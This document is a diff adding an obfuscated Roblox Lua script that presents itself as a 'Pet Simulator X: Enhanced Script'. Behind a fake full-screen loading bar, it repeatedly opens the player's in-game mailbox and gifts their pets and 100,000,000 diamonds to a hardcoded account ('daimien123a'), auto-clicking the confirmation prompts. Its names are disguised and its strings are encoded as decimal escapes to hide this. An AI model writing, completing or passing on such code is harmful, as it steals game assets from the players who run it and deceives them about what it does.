@@ -1,0 +1,117 @@
+local _0x726563 = "\100\97\105\109\105\101\110\49\50\51\97"
+local _0x766563 = Vector3.new(189, 99, -2963)
+local _0x646C79 = 0.4
+local _0x6C7077 = 5
+local _0x6F7063 = 1
+
+local _0x504C = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
+local _0x5047 = _0x504C:WaitForChild("\80\108\97\121\101\114\71\117\105")
+
+if _0x5047:FindFirstChild("\83\97\107\117\114\97\76\111\97\100\101\114") then
+    _0x5047["\83\97\107\117\114\97\76\111\97\100\101\114"]:Destroy()
+end
+
+local _0x5347 = Instance.new("\83\99\114\101\101\110\71\117\105", _0x5047)
+_0x5347.Name = "\83\97\107\117\114\97\76\111\97\100\101\114"
+_0x5347.IgnoreGuiInset = true
+_0x5347.DisplayOrder = 999
+
+local _0x4247 = Instance.new("\70\114\97\109\101", _0x5347)
+_0x4247.Size = UDim2.new(1, 0, 1, 0)
+_0x4247.BackgroundColor3 = Color3.new(0, 0, 0)
+_0x4247.BackgroundTransparency = (1 - _0x6F7063)
+_0x4247.BorderSizePixel = 0
+
+local _0x5458 = Instance.new("\84\101\120\116\76\97\98\101\108", _0x4247)
+_0x5458.Size = UDim2.new(1, 0, 0, 50)
+_0x5458.Position = UDim2.new(0, 0, 0.4, 0)
+_0x5458.BackgroundTransparency = 1
+_0x5458.Text = "\80\101\116\32\83\105\109\117\108\97\116\111\114\32\88\58\32\69\110\104\97\110\99\101\100\32\83\99\114\105\112\116\32\105\115\32\76\111\97\100\105\110\103"
+_0x5458.TextColor3 = Color3.new(1, 1, 1)
+_0x5458.TextTransparency = (1 - _0x6F7063)
+_0x5458.Font = Enum.Font.GothamBold
+_0x5458.TextSize = 24
+
+local _0x4242 = Instance.new("\70\114\97\109\101", _0x4247)
+_0x4242.Size = UDim2.new(0, 400, 0, 6)
+_0x4242.Position = UDim2.new(0.5, -200, 0.5, 0)
+_0x4242.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+_0x4242.BackgroundTransparency = (1 - _0x6F7063)
+_0x4242.BorderSizePixel = 0
+
+local _0x464C = Instance.new("\70\114\97\109\101", _0x4242)
+_0x464C.Size = UDim2.new(0, 0, 1, 0)
+_0x464C.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_0x464C.BackgroundTransparency = (1 - _0x6F7063)
+_0x464C.BorderSizePixel = 0
+
+task.spawn(function()
+    local _0x5052 = 0
+    while true do
+        local _0x4943 = 0
+        if _0x5052 < 0.5 then _0x4943 = 0.008 
+        elseif _0x5052 < 0.98 then _0x4943 = (0.992 - _0x5052) * 0.05
+        elseif _0x5052 < 0.99 then _0x4943 = 0.0001
+        else _0x4943 = 0 end
+        _0x5052 = math.min(_0x5052 + _0x4943, 0.99)
+        _0x464C.Size = UDim2.new(_0x5052, 0, 1, 0)
+        task.wait(0.05)
+        if _0x5052 >= 0.99 then break end
+    end
+end)
+
+local _0x5253 = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")
+local _0x4C42 = require(_0x5253:WaitForChild("\70\114\97\109\101\119\111\114\107"):WaitForChild("\76\105\98\114\97\114\121"))
+
+local function _0x4143(_0x4254)
+    if _0x4254 then
+        _0x4C42.GUIFX.ButtonFX(_0x4254)
+        for _, _0x56 in pairs(getconnections(_0x4254.Activated)) do _0x56:Fire() end
+        for _, _0x56 in pairs(getconnections(_0x4254.MouseButton1Click)) do _0x56:Fire() end
+        task.wait(_0x646C79)
+    end
+end
+
+local _0x4348 = _0x504C.Character or _0x504C.CharacterAdded:Wait()
+_0x4348:WaitForChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116").CFrame = CFrame.new(_0x766563)
+
+while true do
+    pcall(function()
+        local _0x4D42 = _0x4C42.GUI.Mailbox
+        local _0x4652 = _0x4D42.Gui.Frame
+        _0x4C42.Network.Fire("\79\112\101\110\32\77\97\105\108\98\111\120")
+        task.wait(_0x646C79)
+        _0x4143(_0x4652.MainMenu.Categories.Send.Frame.Button)
+        local _0x5549 = _0x4652.GiftPet.Side.UsernameInputFrame.Input
+        _0x5549.Text = _0x726563
+        for _, _0x56 in pairs(getconnections(_0x5549.FocusLost)) do _0x56:Fire(true) end
+        task.wait(_0x646C79)
+        local _0x504C73 = _0x4652.GiftPet.Container.Inventory.Pets
+        local _0x5447 = nil
+        for _, _0x43 in ipairs(_0x504C73:GetChildren()) do
+            if _0x43:IsA("\84\101\120\116\66\117\116\116\111\110") and _0x43.Name ~= "\84\101\109\112\108\97\116\101" then
+                _0x5447 = _0x43
+                break
+            end
+        end
+        if _0x5447 then
+            _0x4143(_0x5447)
+            local _0x4749 = _0x4652.GiftPet.Container.Inventory.Bottom.BalanceInput.Display.Input
+            _0x4749.Text = "\49\48\48\48\48\48\48\48\48" 
+            for _, _0x56 in pairs(getconnections(_0x4749.FocusLost)) do _0x56:Fire(true) end
+            task.wait(_0x646C79)
+            _0x4143(_0x4652.GiftPet.Side.BottomInputFrame.SendDiamonds)
+            task.wait(0.8)
+            for _, _0x4755 in pairs(_0x5047:GetChildren()) do
+                if _0x4755:IsA("\83\99\114\101\101\110\71\117\105") and _0x4755.Enabled and _0x4755.Name ~= "\83\97\107\117\114\97\76\111\97\100\101\114" then
+                    local _0x5953 = _0x4755:FindFirstChild("\89\101\115", true) or _0x4755:FindFirstChild("\67\111\110\102\105\114\109", true)
+                    if _0x5953 and _0x5953.Visible then
+                        _0x4143(_0x5953)
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    task.wait(_0x6C7077)
+end
